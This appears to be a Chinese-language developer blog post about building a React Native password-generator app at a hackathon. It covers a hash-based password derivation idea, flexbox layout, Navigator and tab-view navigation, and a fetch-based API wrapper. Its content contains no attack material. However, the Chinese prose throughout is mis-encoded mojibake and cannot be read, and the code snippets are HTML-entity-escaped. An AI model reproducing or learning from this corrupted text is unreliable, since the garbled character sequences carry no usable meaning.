æœ‰ï¼é‚£å°±æ˜¯ä¸è¦ç”¨å„²å­˜çš„ï¼Œè€Œæ˜¯ç”¨ã€Œç”¢ç”Ÿã€çš„ï¼Œåªè¦æœ‰ä¸€å¥—é‚è¼¯è² è²¬ç”¢ç”Ÿå¯†ç¢¼ï¼Œä¿è­‰è¼¸å…¥ä¸€æ¨£ï¼Œè¼¸å‡ºä¹Ÿä¸€æ¨£ï¼Œå°±å¯ä»¥åˆ©ç”¨é€™ä¸€å¥—é‚è¼¯æ¯ä¸€æ¬¡éƒ½ç”¢ç”Ÿå¯†ç¢¼ã€‚
èˆ‰å€‹ä¾‹å­ï¼Œå‡è¨­é€™å¥—é‚è¼¯æ˜¯
password = sha_256(root_password + domain_name + &#x27;I_AM_WEEK_SALT&#x27;)

é€™æ¨£ä½ åªè¦æœ‰ä½ çš„ä¸»å¯†ç¢¼ï¼ˆroot_passwordï¼‰è·Ÿä½ è¦ç™»å…¥çš„ç¶²ç«™ï¼Œå°±èƒ½å¹«ä½ ç”¢ç”Ÿå‡ºä¸€çµ„ç¨ç‰¹çš„å¯†ç¢¼ã€‚
é€™å°±æ˜¯é€™å€‹ç”¢å“çš„æ ¸å¿ƒæ¦‚å¿µã€‚
ä¸éï¼Œä¸Šé¢é‚£å¥—é‚è¼¯æœ‰å€‹å•é¡Œæ˜¯ï¼šå‡å¦‚æˆ‘æŸå€‹ç¶²ç«™å¯†ç¢¼å¤–æ´©äº†ï¼Œæˆ‘æƒ³æ›ä¸€å€‹ï¼Œæ€éº¼æ›ï¼Ÿé€™æ™‚å€™åˆè¦å¼•é€²ä¸€å€‹æ–°çš„åƒæ•¸å«åš changeIDï¼Œæ˜¯ä¸€å€‹æ•¸å­—ï¼ŒæŠŠå¯†ç¢¼ç”¢ç”Ÿçš„é‚è¼¯è®Šæˆ
password = sha_256(root_password + domain_name + changeID + &#x27;I_AM_WEEK_SALT&#x27;)

å°±å¯ä»¥ä»»æ„æ›´æ›ç„¡é™æ¬¡å¯†ç¢¼ã€‚ä¸éå…¶å¯¦é€™æ¨£ï¼Œä¹Ÿé ‚å¤šå°±æ˜¯ä¸€å€‹å¯†ç¢¼ç”Ÿæˆå™¨ã€‚ç•¶è¦åŠ ä¸Šã€Œç®¡ç†ã€çš„åŠŸèƒ½æ™‚ï¼Œå°±æ¯”è¼ƒéº»ç…©äº†ï¼Œä¾‹å¦‚èªªæˆ‘å€‘æƒ³è¦å¹«ä½¿ç”¨è€…å„²å­˜ä»–çš„å¸³è™Ÿï¼Œå°±å¯ä»¥è‡ªå‹•å¡«å…¥ã€‚
å› æ­¤æˆ‘å€‘å°±è¦æœ‰å¾Œç«¯çš„ DB å»è¨˜éŒ„é€™äº›è³‡æ–™ï¼Œä¸¦ä¸”è¦æœ‰ç™»å…¥æ©Ÿåˆ¶ï¼Œè€Œä¸”ä¸€æ—¦å¼•å…¥ç™»å…¥æ©Ÿåˆ¶ï¼Œå°±é•åäº†ã€Œä¸æƒ³å„²å­˜ä»»ä½•å¯†ç¢¼ã€çš„é€™å€‹åˆè¡·ã€‚ç¸½ä¹‹ï¼Œåœ¨è¨è«–ä¸€äº› feature è¦ä¸è¦åšçš„æ™‚å€™ï¼ŒèŠ±äº†å¾ˆå¤šæ™‚é–“ï¼Œè¨è«–äº†å¾ˆä¹…ã€‚
å› ç‚ºé€™äº›å…§å®¹å…¶å¯¦æœ‰é»ç‘£ç¢ï¼Œå› æ­¤æˆ‘å°±ä¸å¤šæäº†ï¼Œå¦‚æœä½ å°é€™å€‹æ¦‚å¿µæœ‰èˆˆè¶£ï¼Œå¯ä»¥åƒè€ƒ LessPassã€‚é€™è·Ÿæˆ‘éšŠå‹æƒ³çš„ idea æœ‰ 87% åƒï¼Œè€Œä¸”åšå¾—å¾ˆå®Œæ•´ï¼Œå¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚
èªªå¥½çš„ React Native å‘¢ï¼Ÿå¥½äº†ï¼Œå¤§æ¦‚ä»‹ç´¹å®Œç”¢å“ä¹‹å¾Œï¼Œçµ‚æ–¼è¦é€²å…¥åˆ° React Native çš„éƒ¨åˆ†ã€‚å› ç‚ºæˆ‘ä¹‹å‰æœ‰å¯«é React + Redux çš„ç¶²ç«™ï¼Œä¹Ÿæœ‰ run éä¸€æ¬¡ React Native çš„ç°¡å–®ç¯„ä¾‹ï¼ˆHello Worldï¼‰ï¼Œæ‰€ä»¥å° React Native ä¸ç®—é™Œç”Ÿï¼Œè‡³å°‘èƒ½ build çš„èµ·ä¾†ï¼
å°±è®“æˆ‘å€‘å…ˆå¾é€™å€‹ App çš„ç¬¬ä¸€é é–‹å§‹å§ï¼


é€™ä¸€é å¾ˆç°¡å–®ï¼Œå°±æ˜¯ä¸€å¼µå¤§å¼µèƒŒæ™¯åœ–ï¼Œä¸Šé¢æ”¾ logo è·Ÿä¸€äº›å­—ï¼Œå†åŠ å…©å€‹æŒ‰éˆ•è·Ÿä¸€å€‹å¯ä»¥é»çš„ã€ŒJoin Nowã€ã€‚å…¶å¯¦ä»¥å‰åœ¨å¯« Android çš„æ™‚å€™ï¼Œæœ€éº»ç…©çš„ä¸æ˜¯ç¨‹å¼ç¢¼ï¼Œè€Œæ˜¯ç‰ˆé¢ï¼ç›´åˆ°ç¾åœ¨ï¼Œæˆ‘é‚„æ˜¯è¦ºå¾—è‡ªå·±è·Ÿ Android çš„ Layout å¾ˆä¸ç†Ÿï¼Œæ²’è¾¦æ³•æ’å‡ºè‡ªå·±æƒ³è¦çš„ç‰ˆé¢ã€‚
ä½†æ˜¯ç¾åœ¨æˆ‘å€‘æœ‰äº† React Nativeï¼Œæœ‰äº†æ–°çš„æ’ç‰ˆæ–¹å¼ï¼šflexboxã€‚
å¦‚æœä½ ä¸çŸ¥é“ä»€éº¼æ˜¯ flexboxï¼Œæˆ‘å¯ä»¥å¾ˆç°¡å–®çš„ä»‹ç´¹ä¸€ä¸‹ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ä½ å¯ä»¥é¸æ“‡ä½ è¦ç›´çš„æ’é‚„æ˜¯æ©«çš„æ’ã€è¦é ä¸Šé ä¸‹å°é½Šé‚„æ˜¯ç½®ä¸­ã€ç©ºéš™æ‡‰è©²æ€éº¼åˆ†é…ã€æ¯å€‹ç‰ˆé¢ä½”å¤šå°‘æ¯”ä¾‹ç­‰ç­‰ã€‚æˆ‘è‡ªå·±è¦ºå¾—æ˜¯å€‹æ»¿ç›´è¦ºçš„æ’ç‰ˆæ–¹å¼ã€‚
ä»¥ä¸Šé¢é‚£å€‹ç‰ˆé¢ç‚ºä¾‹ï¼Œå°±å¯ä»¥ç”¨ç›´çš„ä¾†æ’ï¼Œç„¶å¾ŒæŒ‰ç…§æ¯”ä¾‹åˆ†æˆå››å¡Šï¼ŒæŒ‰éˆ•é‚£å€‹å€å¡Šå…§éƒ¨ç”¨æ©«çš„æ’ï¼Œç„¶å¾Œåˆ‡å°åŠï¼š


å…¶å¯¦é€™å°±å¾ˆåƒ React ç”¨ component ä¾†åˆ‡çš„æ¦‚å¿µï¼Œåˆ‡æˆå¾ˆå¤šå¾ˆå¤šç´°å°çš„çµ„ä»¶å†åˆåœ¨ä¸€èµ·ã€‚
æˆ‘ç•¶åˆå¯« code çš„æ™‚å€™ï¼Œéƒ½æŠŠé€™å€‹åˆ†é é–‹åœ¨æ—é‚Šï¼Œæ˜¯å¾ˆæ·ºé¡¯æ˜“æ‡‚çš„åœ–ç‰‡èªªæ˜ï¼Œå¯ä»¥å¾ˆæ–¹ä¾¿çš„å°±æ‰¾åˆ°è‡ªå·±æƒ³è¦çš„æ’ç‰ˆæ–¹å¼æ‡‰è©²æ€éº¼ç”¨ã€‚
è‡³æ–¼åœ¨æŒ‰éˆ•çš„éƒ¨åˆ†ï¼Œæˆ‘æ˜¯ç”¨ APSL&#x2F;react-native-button é€™å€‹ç¬¬ä¸‰æ–¹çš„å¥—ä»¶ï¼Œä½†è©³ç´°åŸå› æˆ‘ä¹Ÿå¿˜è¨˜äº†ï¼Œå¯èƒ½æ˜¯ç”¨åŸç”Ÿçš„ç¢°åˆ°ä»€éº¼å•é¡Œï¼Œæ‰€ä»¥å»æ‰¾äº†ç¬¬ä¸‰æ–¹çš„ä¾†ç”¨ã€‚
é€™é‚Šé™„ä¸Šæœ€å¾Œå¯«å‡ºä¾†çš„éƒ¨åˆ†ç¨‹å¼ç¢¼ï¼š
render() &#123;  return (    &lt;View style=&#123;styles.container&#125;&gt;      &lt;View style=&#123;styles.bgImageWrapper&#125;&gt;        &lt;Image source=&#123;require(&#x27;../img/bg.png&#x27;)&#125; style=&#123;styles.bg&#125; /&gt;      &lt;/View&gt;      &lt;Image source=&#123;require(&#x27;../img/logo-white.png&#x27;)&#125; style=&#123;styles.image&#125;/&gt;      &lt;Text style=&#123;styles.text&#125;&gt;Only you have your password&lt;/Text&gt;      &lt;View style=&#123;styles.btnGroup&#125;&gt;        &lt;Button style=&#123;styles.btnGuest&#125; textStyle=&#123;&#123;fontSize: 18, color: &#x27;white&#x27;&#125;&#125; onPress=&#123;this.onGuestClick.bind(this)&#125;&gt;          Use as guest        &lt;/Button&gt;        &lt;Button style=&#123;styles.btnSignIn&#125; textStyle=&#123;&#123;fontSize: 18, color: &#x27;white&#x27;&#125;&#125; onPress=&#123;this.onSignInClick.bind(this)&#125;&gt;          Sign in        &lt;/Button&gt;      &lt;/View&gt;      &lt;Text style=&#123;styles.textJoin&#125; onPress=&#123;this.onJoinClick.bind(this)&#125;&gt;Join now&lt;/Text&gt;    &lt;/View&gt;  );&#125;

é€™é‚Šæœ‰å…©é»è¦æä¸€ä¸‹ï¼Œç¬¬ä¸€é»æ˜¯ textStyle çš„éƒ¨åˆ†æœ€å¥½ä¹Ÿå…ˆå®£å‘Šæˆè®Šæ•¸å†ä½¿ç”¨ï¼Œä½†å› ç‚ºæ˜¯é»‘å®¢æ¾æ‰€ä»¥æ¯”è¼ƒå°‘æ™‚é–“å»åšé€™äº›èª¿æ•´ï¼Œå°±æ¯”è¼ƒä¸å¥½çš„ç›´æ¥é€™æ¨£å¯«äº†ã€‚ç¬¬äºŒé»æ˜¯this.onGuestClick.bind(this)é€™æ¨£çš„æ–¹å¼å…¶å¯¦ä¸å¥½ï¼Œä½†ä¸çŸ¥é“ç‚ºä»€éº¼ï¼Œæˆ‘æ²’è¾¦æ³•åœ¨constructorè£¡é¢å…ˆbindï¼Œæ‰€ä»¥åªå¥½é€™æ¨£å¯«äº†ã€‚
å…¶å¯¦åªè¦èƒ½æŠŠé€™å€‹ render çš„å‡½å¼å¯«å‡ºä¾†ï¼Œé€™ä¸€é å°±çœ‹èµ·ä¾†æœ‰æ¨¡æœ‰æ¨£äº†ï¼Œå¯æ˜¯å•é¡Œæ˜¯ï¼Œæˆ‘å€‘é‚„æœ‰å…¶ä»–å¾ˆå¤šé ã€‚è¦æ€éº¼åˆ‡æ›åˆ°åˆ¥çš„ç•«é¢å‘¢ï¼Ÿ
Navigatorå¦‚æœè¦åœ¨å¤šå€‹ç•«é¢ä¹‹é–“åˆ‡æ›ï¼Œå°±è¦é Navigatoré€™å€‹çµ„ä»¶äº†ã€‚å¾å®˜æ–¹æ–‡ä»¶å¯ä»¥å¤§è‡´çœ‹å‡ºç”¨æ³•ï¼Œæˆ–æ˜¯å¯ä»¥åƒè€ƒåˆ¥äººå¯«çš„æ•™å­¸ã€‚
ç›´æ¥é™„ä¸Šç¨‹å¼ç¢¼å†ä¾†è§£é‡‹
import React, &#123; Component &#125; from &#x27;react&#x27;;import &#123;  Navigator&#125; from &#x27;react-native&#x27;;import MainScene from &#x27;./scenes/MainScene&#x27;;export default class Zeropass extends Component &#123;  render() &#123;    var defaultName = &quot;MainScene&quot;;    var defaultComp = MainScene;    return (      &lt;Navigator        initialRoute=&#123;&#123;          name: defaultName,          component: defaultComp        &#125;&#125;        configureScene=&#123;(route) =&gt; &#123;          return Navigator.SceneConfigs.PushFromRight;        &#125;&#125;        renderScene=&#123;(route, navigator) =&gt; &#123;          var Component = route.component;          return (            &lt;Component &#123;...route.params&#125; navigator=&#123;navigator&#125; /&gt;          );        &#125;&#125;      /&gt;    )  &#125;&#125;

initialRouteå°±æ˜¯ä¸€é–‹å§‹çš„æ™‚å€™è¦çµ¦ä»€éº¼åƒæ•¸ï¼Œå¯ä»¥æƒ³æˆæ˜¯ defaultState çš„æ„Ÿè¦ºï¼ŒconfigureSceneæ˜¯è·Ÿæ›å ´å‹•ç•«æœ‰é—œä¿‚çš„ï¼Œé€™é‚Šç›´æ¥ç”¨å…§å»ºçš„PushFromRightï¼Œæœƒæœ‰ä¸€å€‹é‚„ä¸éŒ¯çš„å¾å³é‚Šæ¨é€²ä¾†çš„æ•ˆæœã€‚
renderSceneå‰‡æ˜¯ç²¾è¯æ‰€åœ¨ï¼Œå°±æ˜¯Navigatorçš„renderå‡½å¼ï¼Œèªªæ˜æ‡‰è©²è¦æ¸²æŸ“å‡ºä»€éº¼æ±è¥¿ã€‚
é€™é‚Šå…ˆå–route.componentï¼Œé€™å€‹componentå°æ‡‰åˆ°çš„å°±æ˜¯æˆ‘åœ¨initialRouteé€™é‚Šçµ¦çš„componenté€™å€‹ keyï¼Œä¹‹å¾Œå¦‚æœè¦æ›é çš„è©±ä¹Ÿè¦ç”¨é€™å€‹ key å¸¶æ±è¥¿é€²ä¾†ã€‚
ä¸¦ä¸”å‚³å…¥navigatorè®“çµ„ä»¶å¯ä»¥å‘¼å«ï¼Œä»¥åŠåŠ ä¸Š...route.paramsï¼Œå°±å¯ä»¥å¸¶é¡å¤–çš„åƒæ•¸é€²ä¾†ã€‚
é€™åªæ˜¯æœ€åŸºç¤çš„æ¶æ§‹è€Œå·²ï¼Œä½†å¯¦éš›ä¸Šå¦‚æœè¦æ›é ï¼Œæ‡‰è©²è¦æ€éº¼å¯«å‘¢ï¼Ÿ
toNext() &#123;  const &#123; navigator &#125; = this.props;  if(navigator) &#123;    navigator.push(&#123;      name: &#x27;GuestLoginScene&#x27;,      component: GuestLoginScene,    &#125;)  &#125;&#125;

å› ç‚ºåœ¨renderSceneçš„æ™‚å€™ï¼Œæˆ‘å€‘æœ‰æŠŠnavigatorå‚³é€²å»ï¼Œæ‰€ä»¥åœ¨æ¯ä¸€å€‹ component éƒ½å¯ä»¥ç”¨ this.props å–å‡ºä¾†ï¼Œæƒ³è¦æ›é çš„è©±å°±åªè¦ push ä¸€å€‹ç‰©ä»¶é€²å»å°±å¥½äº†ã€‚ç‰©ä»¶çš„æ ¼å¼è‡ªå·±æ±ºå®šå¥½å°±è¡Œäº†ã€‚æ‰€ä»¥ä½ æœƒç™¼ç¾é€™é‚Šçš„æ ¼å¼è·Ÿå‰›å‰›initialRouteå‚³é€²å»çš„æ ¼å¼ä¸€æ¨¡ä¸€æ¨£ã€‚
å¥½äº†ï¼Œæ‰€ä»¥ç¬¬ä¸€é å®Œæˆäº†ã€æ›é çš„å•é¡Œä¹Ÿè§£æ±ºäº†ã€‚å‰©ä¸‹çš„å°±æ˜¯æŠŠå…¶å®ƒé é¢åˆ»å‡ºä¾†ï¼Œå¥½åƒå°±å·®ä¸å¤šäº†ã€‚å‰é€”çœŸæ˜¯ä¸€ç‰‡å…‰æ˜ç’€ç’¨ï¼Œçœ‹ä¾† 24 å°æ™‚å¤ªå¤šäº†ã€‚
ç­‰ç­‰ï¼Œå¯æ˜¯æˆ‘å€‘é‚„æœ‰ Tab å•Š

ç•¶åˆåœ¨åšé€™å€‹é é¢çš„æ™‚å€™ï¼ŒåŸæœ¬çš„è¨­è¨ˆæ˜¯ DrawerLayoutï¼Œå°±æ˜¯ Android é¢¨æ ¼çš„å¾å·¦é‚Šæ»‘å‡ºä¾†çš„åˆ—è¡¨ã€‚å¯æ˜¯å› ç‚ºåœ¨åšé€™å€‹ App æ™‚æƒ³è¦è·¨å¹³å°é€šåƒï¼Œæ‰€ä»¥ Drawer æ–¹æ¡ˆå¯è¦‹æ˜¯è¡Œä¸é€šçš„ã€‚æ³ä¸”ï¼Œæˆ‘çœ‹äº†ä¸€ä¸‹å®˜æ–¹æ–‡ä»¶ï¼Œå¯¦ä½œä¸Šæ„Ÿè¦ºä¹Ÿæ²’é‚£éº¼ç°¡å–®ã€‚
å› æ­¤ï¼Œæœ€å¾Œæ‰¾äº†ç¬¬ä¸‰æ–¹å¥—ä»¶çš„react-native-tab-viewä¾†ç”¨ã€‚å› ç‚ºç„¡è«–åœ¨ iOS æˆ–æ˜¯åœ¨ Androidï¼Œéƒ½å¯ä»¥çœ‹åˆ° Tab çš„å‡ºç¾ï¼Œæ‰€ä»¥æœƒæ¯” Drawer æ›´å¥½ä¸€äº›ã€‚
é€™å€‹ Tabview çš„ç”¨æ³•ç›¸ç•¶ç°¡å–®ï¼Œå®¢è£½åŒ–ç¨‹åº¦æ»¿é«˜çš„ï¼Œåªè¦è‡ªå·±å¯¦ä½œå¹¾å€‹å‡½å¼å°±å¥½ã€‚
const icons = &#123;  account: require(&#x27;../img/icon_account.png&#x27;),  edit: require(&#x27;../img/icon_edit.png&#x27;),  setting: require(&#x27;../img/icon_setting.png&#x27;),  help: require(&#x27;../img/icon_help.png&#x27;),&#125;export default class TabViewExample extends Component &#123;  constructor(props) &#123;    super(props);  &#125;  state = &#123;    index: 0,    routes: [      &#123; key: &#x27;account&#x27;, title: &#x27;Account&#x27;, icon: &#x27;account&#x27;&#125;,      &#123; key: &#x27;new&#x27;, title: &#x27;Create&#x27;, icon: &#x27;edit&#x27; &#125;,      &#123; key: &#x27;setting&#x27;, title: &#x27;Setting&#x27;, icon: &#x27;setting&#x27; &#125;,      &#123; key: &#x27;help&#x27;, title: &#x27;Help&#x27;, icon: &#x27;help&#x27; &#125;,    ],  &#125;;  _handleChangeTab = (index) =&gt; &#123;    this.setState(&#123; index &#125;);  &#125;;  _renderIcon = (&#123; route &#125;) =&gt; &#123;    return (      &lt;Image        source=&#123;icons[route.icon]&#125;        style=&#123;styles.icon&#125;        color=&#x27;white&#x27;      /&gt;    );  &#125;;  _renderHeader = (props) =&gt; &#123;    return (      &lt;TabBar         renderIcon=&#123;this._renderIcon&#125;        tabStyle=&#123;styles.tab&#125;         labelStyle=&#123;styles.label&#125;        &#123;...props&#125; /&gt;    );  &#125;;  _renderScene = (&#123; route &#125;) =&gt; &#123;    console.log(route.key);    switch (route.key) &#123;      case &#x27;account&#x27;:        return &lt;AccountTab /&gt;;      case &#x27;new&#x27;:        return &lt;CreateTab /&gt;;      case &#x27;help&#x27;:        return &lt;HelpTab /&gt;;      case &#x27;setting&#x27;:        return &lt;SettingTab /&gt;;      default:        return null;    &#125;  &#125;;  render() &#123;    return (        &lt;TabViewAnimated          style=&#123;styles.container&#125;          navigationState=&#123;this.state&#125;          renderScene=&#123;this._renderScene&#125;          renderFooter=&#123;this._renderHeader&#125;          onRequestChangeTab=&#123;this._handleChangeTab&#125;        /&gt;    );  &#125;&#125;

è·ŸNavigatorå…¶å¯¦æœ‰ç•°æ›²åŒå·¥ä¹‹å¦™ï¼Œéƒ½æ˜¯é renderSceneé€™å€‹å‡½å¼å»æ±ºå®šå¦‚ä½•æ¸²æŸ“å‡ºç•«é¢ã€‚åœ¨é€™é‚Šå°±å¾ˆç°¡å–®çš„æ ¹æ“šç›®å‰æ‰€é¸åˆ°çš„ key å»æ¸²æŸ“å‡ºç›¸å°æ‡‰çš„çµ„ä»¶å³å¯ã€‚
å¯æ˜¯ï¼Œå‡å¦‚ Tab çš„é é¢ä¹Ÿæ˜¯å·¢ç‹€çš„å‘¢ï¼Ÿä¾‹å¦‚èªªæˆ‘ç¬¬ä¸€å€‹ Tab å¯èƒ½æ˜¯è¼¸å…¥å¯†ç¢¼çš„ç•«é¢ï¼Œè¼¸å…¥å®ŒæŒ‰ä¸‹ç¢ºå®šä¹‹å¾Œè©±è·³åˆ°ä¸‹ä¸€å€‹ç•«é¢ï¼Œé€™å€‹è¦æ€éº¼åšå‘¢ï¼Ÿ
æˆ‘è‡ªå·±çŒœæ‡‰è©²æ˜¯ä¹Ÿå¯ä»¥ç”¨navigatorä¾†åšï¼Œåœ¨renderSceneçš„æ™‚å€™æ¸²æŸ“å‡ºnavigatorï¼Œå…¶ä»–çš„å°±è·Ÿæˆ‘å€‘å‰›é–‹é ­ä»‹ç´¹çš„å·®ä¸å¤šã€‚
æ„æ€å°±æ˜¯ï¼Œæ¯ä¸€å€‹ Tab å…¶å¯¦éƒ½åƒæ˜¯ä¸€å€‹å°çš„ Appï¼Œæœ‰è‡ªå·±çš„navigatorä¾†ç®¡ç†è‡ªå·±çš„ç‹€æ…‹ã€‚
ä½†æ˜¯åœ¨é»‘å®¢æ¾çš„æ™‚å€™ï¼Œæˆ‘ä¸€æ™‚åŠåˆ»æ²’æœ‰æƒ³åˆ°é€™æ¨£çš„è§£æ³•ï¼Œæ–¼æ˜¯å°±æ‰‹åˆ»äº†ä¸€å€‹æœ€ç›´è¦ºã€æœ€æš´åŠ›çš„ã€‚
import SiteScene from &#x27;./SiteScene&#x27;;import PasswordScene from &#x27;./PasswordScene&#x27;;export default class CreateTab extends Component &#123;  constructor(props) &#123;    super(props);        // 2 page    this.state = &#123;      page: 1,      site: &#x27;&#x27;    &#125;  &#125;  goBack() &#123;    this.setState(&#123;      page: 1    &#125;)  &#125;  toNext(site) &#123;    this.setState(&#123;      ...this.state,      page: 2,      site    &#125;)  &#125;  render() &#123;    const &#123; page, site &#125; = this.state;    return (        &lt;View style=&#123;styles.container&#125;&gt;          &lt;View style=&#123;styles.top&#125;&gt;            &lt;Text style=&#123;styles.back&#125; onPress=&#123;this.goBack.bind(this)&#125;&gt;              &#123; page==2 ? &#x27; â† &#x27; : &#x27; &#x27; &#125;            &lt;/Text&gt;          &lt;/View&gt;          &#123;page==1 &amp;&amp; &lt;SiteScene toNext=&#123;this.toNext.bind(this)&#125;/&gt;&#125;          &#123;page==2 &amp;&amp; &lt;PasswordScene site=&#123;site&#125;/&gt;&#125;        &lt;/View&gt;    );  &#125;&#125;;

åœ¨ tab è£¡é¢ç”¨ state ä¾†ç®¡ç†ç›®å‰çš„ indexï¼Œå› ç‚ºåªæœ‰å…©å€‹é é¢æ‰€ä»¥é‚„æ»¿å¥½åšçš„ï¼Œæ ¹æ“š index æ¸²æŸ“å‡ºç›¸å°æ‡‰çš„é é¢å³å¯ã€‚ç„¶å¾Œé‚„å¯ä»¥ç”¨ä¸€å€‹ç°¡å–®çš„ navbar åŒ…èµ·ä¾†ï¼Œå°±å¯ä»¥é»ä¸Šé¢çš„ç®­é ­å›åˆ°ä¸Šä¸€é ã€‚




å°±é€™æ¨£ï¼Œtab çš„å•é¡Œä¹Ÿè§£æ±ºäº†ã€‚çœ‹èµ·ä¾†ä¸€åˆ‡éƒ½ work çš„ä¸éŒ¯ï¼Œå¯ä»¥è‡ªç”±è‡ªåœ¨åœ¨å„å€‹é é¢ä¹‹é–“åˆ‡æ›è‡ªå¦‚äº†ã€‚æ¥ä¸‹ä¾†ï¼Œå¥½åƒå°±åªå‰©ä¸‹ä¸² API äº†ã€‚
APIå› ç‚ºæœ‰æ”¯æ´ async&#x2F;await èªæ³•ï¼Œæ‰€ä»¥å¯«èµ·ä¾†ååˆ†æ¸…çˆ½ã€‚ä¸‹é¢é€™ä¸€æ®µç¨‹å¼ç¢¼æ˜¯è¦å» server æŠ“å–ä½¿ç”¨è€…å„²å­˜éè³‡è¨Šçš„ domain å›ä¾†ã€‚ç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œæˆ‘æŠŠæ‰€æœ‰çš„ API call éƒ½åŒ…åœ¨APIé€™å€‹æª”æ¡ˆè£¡é¢ï¼Œç”¨fetchå»æ‹¿è³‡æ–™ã€‚
const API_URL = &#123;    &#x27;getInfo&#x27;: &#x27;http://api.com/api/v1/users&#x27;,&#125;const API = &#123;  getInfo: async function(uid) &#123;    let response = await fetch(`$&#123;API_URL.getInfo&#125;/$&#123;uid&#125;`);    let json = await response.json();    return json;  &#125;&#125;export default API;

async componentDidMount() &#123;  let domains = [];  this.setState(&#123;    spinnerShow: true  &#125;);  try &#123;    const response = await API.getInfo(store.getId());    domains = response.domains;  &#125; catch(err) &#123;    console.log(err);  &#125;  this.setState(&#123;    dataSource: ds.cloneWithRows(domains),    spinnerShow: false  &#125;)&#125;

ï¼ˆä¸éæˆ‘å¾Œä¾†æƒ³ä¸€ä¸‹ï¼Œé€™æ¨£å­æŠŠcomponentDidMountç›´æ¥åŒ…æˆ async å¥½åƒä¸å¤ªå¥½ï¼Œæ‡‰è©²ç¨ç«‹æˆä¸€å€‹å‡½å¼å»å‘¼å«ï¼‰
é«”é©—è·¨å¹³å°çš„å¨åŠ›å› ç‚ºæˆ‘è‡ªå·±æ˜¯ç”¨ Android çš„ï¼Œæ‰€ä»¥æˆ‘åœ¨é–‹ç™¼çš„æ™‚å€™éƒ½æ˜¯ç›´æ¥ç”¨ Android å¯¦æ©Ÿæ¸¬è©¦ã€‚ä¸å¾—ä¸æå·²ç¶“è¢«è¬›åˆ°çˆ›æ‰çš„ï¼ŒReact Native çš„ hot reloadï¼Œç”¨èµ·ä¾†çœŸçš„å¾ˆçˆ½å¿«ï¼Œåªè¦å„²å­˜æª”æ¡ˆä¹‹å¾Œå°±å¯ä»¥åœ¨ App ä¸Šçœ‹åˆ°æ–°çš„ç•«é¢ã€‚ï¼ˆé›–ç„¶åŸç”Ÿçš„ Android ç¾åœ¨ä¹Ÿæ”¯æ´äº†ï¼Œä½†æˆ‘é‚„æ²’æœ‰æ©Ÿæœƒé«”é©—åˆ°å°±æ˜¯äº†ï¼‰
å…¶å¯¦åŸæœ¬æˆ‘çš„éšŠå‹åªæœ‰é æœŸæˆ‘é–‹ç™¼å‡º Android çš„ç‰ˆæœ¬ï¼ˆä»–å€‘éƒ½ç”¨ iPhoneï¼‰ï¼Œä½†æ®Šä¸çŸ¥ React Native å¤ªéå¼·å¤§ï¼Œç•¶æˆ‘æŠŠ App é–‹ç™¼åˆ°ä¹æˆçš„æ™‚å€™ï¼Œæƒ³èªªä¾†è©¦è©¦çœ‹ build åˆ° iOS ä¸Šå¥½äº†ï¼Œç™¼ç¾è·Ÿæˆ‘æƒ³åƒä¸­çš„ä¸ä¸€æ¨£ã€‚
æˆ‘ä»¥ç‚ºè¦ build çš„æ™‚å€™æ‡‰è©²æœƒç¢°åˆ°å¾ˆå¤šéŒ¯èª¤ç„¶å¾Œè¦æ…¢æ…¢ä¿®ï¼Œæˆ–è€…æ˜¯æ²’æœ‰ Apple çš„é–‹ç™¼è€…å¸³è™Ÿå°±æ²’è¾¦æ³• build åˆ°æ‰‹æ©Ÿä¸Šä¹‹é¡çš„ã€‚
ä½†æˆ‘å®Œå®Œå…¨å…¨éŒ¯äº†ã€‚React Native å°±æ˜¯é‚£éº¼ç°¡å–®ï¼Œè¶…ç´šè¼•é¬†å°±å¯ä»¥æœ‰ä¸€å€‹ iOS çš„ç‰ˆæœ¬ã€‚ä¹Ÿæ ¹æœ¬ä¸ç”¨ä»€éº¼ Apple é–‹ç™¼è€…å¸³è™Ÿï¼Œå°±å¯ä»¥å®‰è£åˆ°æ‰‹æ©Ÿä¸Šé¢æ¸¬è©¦ï¼ˆåªæ˜¯è¦é–‹ä¸€äº›å®‰å…¨æ€§è¨­å®šå°±æ˜¯äº†ï¼‰ã€‚
åœ¨ build çš„æ™‚å€™æ˜¯æœ‰ç¢°åˆ°ä¸€é»å°å•é¡Œï¼Œä½†æ‹œé Google å¤§ç¥ä¹‹å¾ŒåŸºæœ¬ä¸Šå°±è§£æ±ºäº†ã€‚
ï¼ˆä¸éæœƒé‚£éº¼è¼•é¬†ï¼Œä¹Ÿæ˜¯å› ç‚ºæˆ‘åŸºæœ¬ä¸Šæ²’ç”¨åˆ° Native çš„åŠŸèƒ½ï¼Œæ’ç‰ˆä¹Ÿæ˜¯å…©å€‹å¹³å°éƒ½é•·ä¸€æ¨¡ä¸€æ¨£ï¼Œæ‰€ä»¥å¯ä»¥å…±ç”¨ 100% çš„ç¨‹å¼ç¢¼ã€‚ï¼‰
é™¤äº† iOS å¾ˆè¼•é¬†ä»¥å¤–ï¼ŒAndroid å¦‚æœè¦ç”¢ç”Ÿå¯ä»¥ä¸Š Google play çš„å®‰è£åŒ…ä¹Ÿå¾ˆå®¹æ˜“ï¼Œå®˜æ–¹æ•™å­¸å¯«çš„è¶…ç´šæ¸…æ¥šï¼Œå°±åƒæ•¸å¡«ä¸€å¡«ä»¥å¾Œæ‰“å€‹æŒ‡ä»¤ï¼Œå‰©ä¸‹çš„å…¨éƒ¨éƒ½å¹«ä½ åšå¥½ã€‚
çµè«–é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æƒ³åˆ†äº«ä¸€ä¸‹ç•¶åˆç¢°åˆ°çš„å›°é›£ä»¥åŠé–‹ç™¼çš„æ­·ç¨‹ï¼ŒèŠ±æœ€ä¹…æ™‚é–“çš„æ˜¯æ’ç‰ˆï¼ˆå› ç‚ºå° flexbox æ²’é‚£éº¼ç†Ÿï¼Œæ‰€ä»¥ä¸çŸ¥é“æ’å‡ºä¾†æœƒæ˜¯æ€æ¨£ï¼‰ï¼Œé‚„æœ‰ Tab é‚£ä¸€æ®µä¹ŸèŠ±äº†ä¸€é»æ™‚é–“ç ”ç©¶ä½œæ³•ã€‚ä½†ç¸½é«”ä¾†èªªï¼Œæˆ‘è¦ºå¾— React Native çš„é–‹ç™¼æ•ˆç‡æ˜¯å¾ˆé«˜çš„ã€‚
